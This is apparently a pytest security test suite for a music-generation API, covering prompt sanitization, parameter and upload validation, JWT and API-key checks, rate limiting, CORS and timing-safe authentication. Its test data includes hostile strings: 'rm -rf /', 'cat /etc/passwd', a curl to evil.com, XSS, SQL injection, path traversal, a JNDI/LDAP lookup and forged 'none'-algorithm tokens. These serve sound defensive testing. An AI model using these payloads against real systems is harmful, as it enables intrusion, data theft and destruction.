"""
Security tests for input validation and authentication.

Tests input sanitization, validation, authentication, authorization,
and protection against common security vulnerabilities.
"""

import pytest
import json
import base64
import hashlib
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, List, Any
import re
import secrets
from datetime import datetime, timedelta

from fastapi.testclient import TestClient
from music_gen.api.main import create_app
from music_gen.core.interfaces.services import GenerationRequest
from music_gen.core.exceptions import ValidationError, AuthenticationError


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization."""

    def test_prompt_injection_protection(self):
        """Test protection against prompt injection attacks."""
        malicious_prompts = [
            # Command injection attempts
            "Generate music; rm -rf /",
            "Music && cat /etc/passwd",
            "Song | curl http://evil.com",
            # Script injection
            "<script>alert('xss')</script> music",
            "javascript:alert('xss') song",
            "{{7*7}} mathematical music",
            # SQL injection patterns
            "'; DROP TABLE users; --",
            "music' UNION SELECT * FROM secrets--",
            # Path traversal
            "../../../etc/passwd music",
            "..\\..\\windows\\system32\\config",
            # Template injection
            "${jndi:ldap://evil.com/evil}",
            "#{7*7} music expression",
            # Excessive length
            "A" * 10000,
            # Unicode/encoding attacks
            "\u0000\u0001\u0002 music",
            "\x00\x01\x02 song",
        ]

        for malicious_prompt in malicious_prompts:
            # Test prompt validation
            try:
                request = GenerationRequest(prompt=malicious_prompt, duration=10.0)

                # Validate the prompt
                validated_prompt = self._validate_prompt(request.prompt)

                # Should either be rejected or sanitized
                if validated_prompt != malicious_prompt:
                    # Prompt was sanitized
                    assert len(validated_prompt) <= 1000  # Length limit
                    assert not any(
                        char in validated_prompt for char in ["<", ">", "{", "}", ";", "|"]
                    )
                else:
                    # If not sanitized, should be short and safe
                    assert len(validated_prompt) <= 200

            except ValidationError:
                # Validation rejection is acceptable
                pass

    def _validate_prompt(self, prompt: str) -> str:
        """Example prompt validation function."""
        if not prompt or not prompt.strip():
            raise ValidationError("Prompt cannot be empty")

        # Length validation
        if len(prompt) > 1000:
            raise ValidationError("Prompt too long")

        # Character sanitization
        dangerous_chars = ["<", ">", "{", "}", ";", "|", "&", "$", "`"]
        for char in dangerous_chars:
            if char in prompt:
                prompt = prompt.replace(char, "")

        # Remove control characters
        prompt = "".join(char for char in prompt if ord(char) >= 32)

        # Trim whitespace
        prompt = prompt.strip()

        if not prompt:
            raise ValidationError("Prompt cannot be empty after sanitization")

        return prompt

    def test_parameter_validation(self):
        """Test validation of generation parameters."""
        invalid_parameters = [
            # Invalid duration
            {"prompt": "Test", "duration": -1.0},
            {"prompt": "Test", "duration": 0.0},
            {"prompt": "Test", "duration": 1000.0},  # Too long
            {"prompt": "Test", "duration": float("inf")},
            {"prompt": "Test", "duration": float("nan")},
            # Invalid temperature
            {"prompt": "Test", "temperature": -1.0},
            {"prompt": "Test", "temperature": 3.0},  # Too high
            {"prompt": "Test", "temperature": float("inf")},
            # Invalid top_k
            {"prompt": "Test", "top_k": -1},
            {"prompt": "Test", "top_k": 0},
            {"prompt": "Test", "top_k": 10000},  # Too high
            # Invalid top_p
            {"prompt": "Test", "top_p": -0.1},
            {"prompt": "Test", "top_p": 1.1},  # > 1.0
            {"prompt": "Test", "top_p": float("inf")},
        ]

        for params in invalid_parameters:
            with pytest.raises(ValidationError):
                self._validate_generation_params(params)

    def _validate_generation_params(self, params: Dict[str, Any]) -> None:
        """Example parameter validation function."""
        # Duration validation
        if "duration" in params:
            duration = params["duration"]
            if not isinstance(duration, (int, float)):
                raise ValidationError("Duration must be numeric")
            if duration <= 0:
                raise ValidationError("Duration must be positive")
            if duration > 300:  # 5 minutes max
                raise ValidationError("Duration too long")
            if not (0 < duration < float("inf")):
                raise ValidationError("Invalid duration value")

        # Temperature validation
        if "temperature" in params:
            temp = params["temperature"]
            if not isinstance(temp, (int, float)):
                raise ValidationError("Temperature must be numeric")
            if not (0.0 < temp <= 2.0):
                raise ValidationError("Temperature must be between 0 and 2")

        # Top-k validation
        if "top_k" in params:
            top_k = params["top_k"]
            if not isinstance(top_k, int):
                raise ValidationError("Top-k must be integer")
            if not (1 <= top_k <= 1000):
                raise ValidationError("Top-k must be between 1 and 1000")

        # Top-p validation
        if "top_p" in params:
            top_p = params["top_p"]
            if not isinstance(top_p, (int, float)):
                raise ValidationError("Top-p must be numeric")
            if not (0.0 < top_p <= 1.0):
                raise ValidationError("Top-p must be between 0 and 1")

    def test_file_upload_validation(self):
        """Test validation of file uploads."""
        # Test invalid file types
        invalid_files = [
            {"filename": "malware.exe", "content": b"MZ"},  # Executable
            {"filename": "script.sh", "content": b"#!/bin/bash"},  # Script
            {"filename": "config.xml", "content": b"<?xml version='1.0'?>"},  # XML
            {"filename": "data.json", "content": b'{"key": "value"}'},  # JSON
            {"filename": "large.wav", "content": b"A" * (100 * 1024 * 1024)},  # Too large
        ]

        for file_info in invalid_files:
            with pytest.raises(ValidationError):
                self._validate_audio_file(file_info["filename"], file_info["content"])

    def _validate_audio_file(self, filename: str, content: bytes) -> None:
        """Example file validation function."""
        # Extension validation
        allowed_extensions = [".wav", ".mp3", ".flac", ".ogg"]
        if not any(filename.lower().endswith(ext) for ext in allowed_extensions):
            raise ValidationError("Invalid file type")

        # Size validation (max 50MB)
        if len(content) > 50 * 1024 * 1024:
            raise ValidationError("File too large")

        # Basic content validation
        if len(content) < 44:  # Minimum WAV header size
            raise ValidationError("File too small to be valid audio")

        # Check for executable signatures
        executable_signatures = [b"MZ", b"\x7fELF", b"#!/"]
        for sig in executable_signatures:
            if content.startswith(sig):
                raise ValidationError("Suspicious file content")


@pytest.mark.security
class TestAuthenticationSecurity:
    """Test authentication and authorization security."""

    def test_api_key_validation(self):
        """Test API key validation and security."""
        # Test various invalid API keys
        invalid_keys = [
            "",  # Empty
            "short",  # Too short
            "A" * 1000,  # Too long
            "../../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # XSS
            "key with spaces",  # Invalid characters
            "key\nwith\nnewlines",  # Control characters
        ]

        for invalid_key in invalid_keys:
            with pytest.raises(AuthenticationError):
                self._validate_api_key(invalid_key)

    def _validate_api_key(self, api_key: str) -> None:
        """Example API key validation."""
        if not api_key:
            raise AuthenticationError("API key required")

        # Length validation
        if len(api_key) < 32 or len(api_key) > 128:
            raise AuthenticationError("Invalid API key format")

        # Character validation (alphanumeric + some special chars)
        if not re.match(r"^[a-zA-Z0-9_-]+$", api_key):
            raise AuthenticationError("Invalid API key characters")

        # In real implementation, would check against database
        # For test, assume all valid-format keys are invalid
        raise AuthenticationError("Invalid API key")

    def test_jwt_token_security(self):
        """Test JWT token validation and security."""
        # Test various malicious JWT tokens
        malicious_tokens = [
            # None algorithm attack
            self._create_jwt_token({"alg": "none"}, {"user": "admin"}),
            # Algorithm confusion
            self._create_jwt_token({"alg": "HS256"}, {"user": "admin"}),
            # Expired token
            self._create_jwt_token(
                {"alg": "HS256", "typ": "JWT"},
                {"user": "test", "exp": int((datetime.now() - timedelta(hours=1)).timestamp())},
            ),
            # Invalid signature
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid_signature",
            # Malformed tokens
            "not.a.jwt",
            "eyJ0eXAiOiJKV1QifQ",  # Missing parts
            "",  # Empty
        ]

        for token in malicious_tokens:
            with pytest.raises(AuthenticationError):
                self._validate_jwt_token(token)

    def _create_jwt_token(self, header: Dict, payload: Dict) -> str:
        """Create a test JWT token."""
        import base64
        import json

        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

        return f"{header_b64}.{payload_b64}.fake_signature"

    def _validate_jwt_token(self, token: str) -> Dict[str, Any]:
        """Example JWT token validation."""
        if not token:
            raise AuthenticationError("Token required")

        parts = token.split(".")
        if len(parts) != 3:
            raise AuthenticationError("Invalid token format")

        try:
            # Decode header
            header_data = base64.urlsafe_b64decode(parts[0] + "==").decode()
            header = json.loads(header_data)

            # Check algorithm
            if header.get("alg") == "none":
                raise AuthenticationError("None algorithm not allowed")

            # Decode payload
            payload_data = base64.urlsafe_b64decode(parts[1] + "==").decode()
            payload = json.loads(payload_data)

            # Check expiration
            if "exp" in payload:
                exp_time = datetime.fromtimestamp(payload["exp"])
                if exp_time < datetime.now():
                    raise AuthenticationError("Token expired")

            # In real implementation, would verify signature
            if parts[2] == "fake_signature":
                raise AuthenticationError("Invalid signature")

            return payload

        except (ValueError, json.JSONDecodeError):
            raise AuthenticationError("Invalid token format")

    def test_rate_limiting_security(self):
        """Test rate limiting for security."""
        # Simulate rate limiting scenarios
        rate_limit_tests = [
            {"requests": 100, "window_seconds": 60, "should_block": True},  # Too many requests
            {"requests": 10, "window_seconds": 60, "should_block": False},  # Normal usage
            {"requests": 1000, "window_seconds": 1, "should_block": True},  # Burst attack
        ]

        for test in rate_limit_tests:
            result = self._check_rate_limit("test_user", test["requests"], test["window_seconds"])

            if test["should_block"]:
                assert not result["allowed"]
                assert "rate limit" in result["reason"].lower()
            else:
                assert result["allowed"]

    def _check_rate_limit(self, user_id: str, requests: int, window_seconds: int) -> Dict[str, Any]:
        """Example rate limiting check."""
        # Simple rate limiting logic
        max_requests_per_minute = 60
        max_requests_per_second = 10

        requests_per_second = requests / window_seconds
        requests_per_minute = (
            requests if window_seconds >= 60 else (requests * 60) // window_seconds
        )

        if requests_per_second > max_requests_per_second:
            return {"allowed": False, "reason": "Rate limit exceeded (per second)"}

        if requests_per_minute > max_requests_per_minute:
            return {"allowed": False, "reason": "Rate limit exceeded (per minute)"}

        return {"allowed": True, "reason": "Within limits"}


@pytest.mark.security
class TestAPISecurityHeaders:
    """Test API security headers and configurations."""

    @pytest.fixture
    def security_client(self):
        """Create test client for security testing."""
        app = create_app()
        return TestClient(app)

    def test_security_headers_present(self, security_client):
        """Test that security headers are present."""
        response = security_client.get("/health")

        # Check for important security headers
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
        ]

        for header in expected_headers:
            # Headers might not be present in test environment
            # In production, these should be enforced
            if header in response.headers:
                assert response.headers[header] is not None

    def test_cors_configuration(self, security_client):
        """Test CORS configuration security."""
        # Test preflight request
        response = security_client.options(
            "/api/v1/generate/",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )

        # Should not allow arbitrary origins in production
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            # Should not be wildcard (*) for authenticated endpoints
            if "/generate" in str(response.url):
                assert allowed_origin != "*"

    def test_content_type_validation(self, security_client):
        """Test content type validation."""
        # Test various content types
        invalid_content_types = [
            "text/plain",
            "text/html",
            "application/xml",
            "application/x-www-form-urlencoded",
        ]

        for content_type in invalid_content_types:
            response = security_client.post(
                "/api/v1/generate/",
                content='{"prompt": "test", "duration": 10.0}',
                headers={"Content-Type": content_type},
            )

            # Should reject non-JSON content types for JSON endpoints
            assert response.status_code in [400, 415, 422]


@pytest.mark.security
class TestDataSanitization:
    """Test data sanitization and output encoding."""

    def test_output_sanitization(self):
        """Test that outputs are properly sanitized."""
        # Test potentially dangerous inputs that should be sanitized in outputs
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            '"onclick="alert(\'xss\')"',
            "${jndi:ldap://evil.com/evil}",
            "\x00\x01\x02",  # Control characters
        ]

        for dangerous_input in dangerous_inputs:
            # Simulate processing input and generating output
            sanitized_output = self._sanitize_output(dangerous_input)

            # Check that dangerous patterns are removed or escaped
            assert "<script>" not in sanitized_output
            assert "javascript:" not in sanitized_output
            assert "onclick=" not in sanitized_output
            assert "${jndi:" not in sanitized_output
            assert "\x00" not in sanitized_output

    def _sanitize_output(self, text: str) -> str:
        """Example output sanitization."""
        if not text:
            return ""

        # Remove control characters
        text = "".join(char for char in text if ord(char) >= 32 or char in "\n\r\t")

        # HTML escape
        html_escapes = {
            "<": "&lt;",
            ">": "&gt;",
            "&": "&amp;",
            '"': "&quot;",
            "'": "&#x27;",
        }

        for char, escape in html_escapes.items():
            text = text.replace(char, escape)

        # Remove javascript: and other dangerous protocols
        dangerous_protocols = ["javascript:", "data:", "vbscript:"]
        for protocol in dangerous_protocols:
            text = text.replace(protocol, "")

        # Remove template injection patterns
        injection_patterns = ["${", "#{", "{{", "}}"]
        for pattern in injection_patterns:
            text = text.replace(pattern, "")

        return text

    def test_json_output_security(self):
        """Test JSON output security."""
        # Test that JSON outputs don't contain dangerous content
        test_data = {
            "prompt": "<script>alert('xss')</script>",
            "result": "Generated music with ${user.name}",
            "metadata": {
                "user_input": "'; DROP TABLE users; --",
                "filename": "../../../etc/passwd",
            },
        }

        sanitized_data = self._sanitize_json_output(test_data)

        # Convert to JSON string to check final output
        json_output = json.dumps(sanitized_data)

        # Verify dangerous patterns are not in JSON output
        assert "<script>" not in json_output
        assert "${" not in json_output
        assert "DROP TABLE" not in json_output
        assert "../../../" not in json_output

    def _sanitize_json_output(self, data: Any) -> Any:
        """Recursively sanitize JSON output."""
        if isinstance(data, dict):
            return {key: self._sanitize_json_output(value) for key, value in data.items()}
        elif isinstance(data, list):
            return [self._sanitize_json_output(item) for item in data]
        elif isinstance(data, str):
            return self._sanitize_output(data)
        else:
            return data


@pytest.mark.security
class TestSecurityMiscellaneous:
    """Test miscellaneous security concerns."""

    def test_error_message_security(self):
        """Test that error messages don't leak sensitive information."""
        # Test various error scenarios
        error_scenarios = [
            {"type": "file_not_found", "input": "/etc/passwd"},
            {"type": "database_error", "input": "SELECT * FROM users"},
            {"type": "system_error", "input": "ls -la /"},
        ]

        for scenario in error_scenarios:
            error_message = self._generate_error_message(scenario["type"], scenario["input"])

            # Error messages should not contain:
            # - Full file paths
            # - SQL queries
            # - System commands
            # - Stack traces with sensitive info

            assert "/etc/" not in error_message
            assert "SELECT" not in error_message
            assert "ls -la" not in error_message
            assert len(error_message) < 200  # Keep messages concise

    def _generate_error_message(self, error_type: str, user_input: str) -> str:
        """Generate safe error messages."""
        # Generic error messages that don't leak information
        error_messages = {
            "file_not_found": "The requested file could not be found.",
            "database_error": "A database error occurred. Please try again later.",
            "system_error": "A system error occurred. Please contact support.",
            "validation_error": "Invalid input provided.",
            "authentication_error": "Authentication failed.",
        }

        return error_messages.get(error_type, "An error occurred.")

    def test_session_security(self):
        """Test session management security."""
        # Test session token generation
        tokens = [self._generate_session_token() for _ in range(100)]

        # All tokens should be unique
        assert len(set(tokens)) == 100

        # Tokens should be sufficiently long
        for token in tokens:
            assert len(token) >= 32
            assert token.isalnum() or set(token) <= set(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
            )

    def _generate_session_token(self) -> str:
        """Generate secure session token."""
        return secrets.token_urlsafe(32)

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        # Test that authentication timing is consistent
        # regardless of whether user exists or password is correct

        import time

        # Simulate authentication with various inputs
        auth_times = []

        test_cases = [
            {"username": "admin", "password": "correct_password"},
            {"username": "admin", "password": "wrong_password"},
            {"username": "nonexistent", "password": "any_password"},
            {"username": "test", "password": "test"},
        ]

        for case in test_cases:
            start_time = time.time()
            self._simulate_authentication(case["username"], case["password"])
            end_time = time.time()

            auth_times.append(end_time - start_time)

        # All authentication attempts should take similar time
        # (within reasonable variance)
        min_time = min(auth_times)
        max_time = max(auth_times)

        # Timing difference should be small (less than 50% variance)
        assert (max_time - min_time) / min_time < 0.5

    def _simulate_authentication(self, username: str, password: str) -> bool:
        """Simulate constant-time authentication."""
        import hashlib
        import hmac
        import time

        # Always perform the same operations regardless of input validity

        # Hash the provided password
        provided_hash = hashlib.pbkdf2_hmac("sha256", password.encode(), b"salt", 100000)

        # Get stored hash (or dummy hash if user doesn't exist)
        stored_hash = self._get_password_hash(username)

        # Always perform constant-time comparison
        is_valid = hmac.compare_digest(provided_hash, stored_hash)

        # Add small constant delay to normalize timing
        time.sleep(0.01)

        return is_valid

    def _get_password_hash(self, username: str) -> bytes:
        """Get password hash (or dummy hash for timing attack resistance)."""
        import hashlib

        # In real implementation, would query database
        # For timing attack resistance, always return a hash

        known_users = {
            "admin": b"admin_password_hash",
            "test": b"test_password_hash",
        }

        # Return actual hash if user exists, dummy hash otherwise
        if username in known_users:
            return known_users[username]
        else:
            # Return dummy hash of consistent length
            return hashlib.pbkdf2_hmac("sha256", b"dummy", b"salt", 100000)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
